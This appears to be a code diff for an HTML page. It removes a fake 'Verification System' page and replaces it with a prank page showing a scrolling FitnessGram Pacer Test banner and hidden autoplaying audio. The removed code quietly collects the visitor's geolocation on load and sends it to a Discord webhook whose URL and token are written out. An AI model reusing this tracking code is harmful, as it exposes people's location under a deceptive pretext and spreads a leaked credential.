@@ -1,54 +1,52 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Verification System</title>
-  <script>
-    // Function to send geolocation data to Discord webhook
-    function sendLocationToWebhook(latitude, longitude) {
-      const webhookURL = 'https://discord.com/api/webhooks/1284743737016057856/DN-8fCOSSJtP3QrwqRsh_FEjGCVox3F9uxtSccf0wM2rIOOtIZsiFQz8fuSjUpOgeH7P'; // Replace with your webhook URL
-      const data = {
-        content: `New user location: Latitude: ${latitude}, Longitude: ${longitude}`
-      };
-
-      fetch(webhookURL, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(data)
-      })
-      .then(response => {
-        if (response.ok) {
-          alert('Location sent successfully!');
-        } else {
-          alert('Failed to send location!');
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FitnessGram Pacer Test</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+            background-color: black;
+            color: white;
+            font-family: Arial, sans-serif;
         }
-      })
-      .catch(error => console.error('Error:', error));
-    }
-
-    // Function to get user's geolocation
-    function getLocation() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(function(position) {
-          const latitude = position.coords.latitude;
-          const longitude = position.coords.longitude;
-
-          // Send location to Discord webhook
-          sendLocationToWebhook(latitude, longitude);
-        }, function(error) {
-          alert('Unable to retrieve your location.');
-        });
-      } else {
-        alert('Geolocation is not supported by this browser.');
-      }
-    }
-  </script>
+        #banner {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            white-space: nowrap;
+            overflow: hidden;
+            box-sizing: border-box;
+            animation: scroll-left 20s linear infinite;
+            font-size: 24px;
+            padding: 10px;
+            background: rgba(0, 0, 0, 0.8);
+            color: white;
+        }
+        @keyframes scroll-left {
+            from {
+                transform: translateX(100%);
+            }
+            to {
+                transform: translateX(-100%);
+            }
+        }
+        audio {
+            display: none;
+        }
+    </style>
 </head>
-<body onload="getLocation()">
-  <h1>Verifying your location...</h1>
-  <p>Please allow location access to proceed.</p>
+<body>
+    <div id="banner">
+        The FitnessGram™ Pacer Test is a multistage aerobic capacity test that progressively gets more difficult as it continues. The 20 meter pacer test will begin on the word start. On your mark, get ready, start. The 20 meter pacer test will begin on the word start. The running speed starts slowly, but gets faster each minute after you hear this signal. [beep] A single lap should be completed each time you hear this sound. [ding] Remember to run in a straight line, and run as long as possible. The second time you fail to complete a lap before the sound, your test is over. The test will begin on the word start. On your mark, get ready, start.
+    </div>
+    <audio autoplay loop>
+        <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mpeg">
+        Your browser does not support the audio element.
+    </audio>
 </body>
 </html>
